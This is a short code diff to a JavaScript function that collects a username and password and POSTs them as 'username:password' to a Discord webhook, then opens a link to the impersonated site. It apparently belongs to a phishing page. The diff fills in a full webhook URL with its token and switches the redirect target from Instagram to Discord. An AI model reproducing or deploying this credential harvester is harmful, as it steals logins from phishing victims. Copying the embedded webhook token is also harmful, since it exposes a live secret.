@@ -1,6 +1,6 @@
 function sendMessage() {
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK URL"); //here your discord webhook
+    request.open("POST", "https://discord.com/api/webhooks/1274498078321279036/KBMk9wRJojOFpVoFgYs9wE5Rs95cbyAgeeluMvNrgiFBPILBIc94XN-04XfyuGooIUoH"); //here your discord webhook
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -10,12 +10,10 @@ function sendMessage() {
     let data = username+":"+password
 
     var params = {
-      username: "Instagram",
-      avatar_url: "",
       content: data
     }
 
-    let link = "http://instagram.com/"+username
+    let link = "http://discord.com/"+username
 
     window.open(link)
 
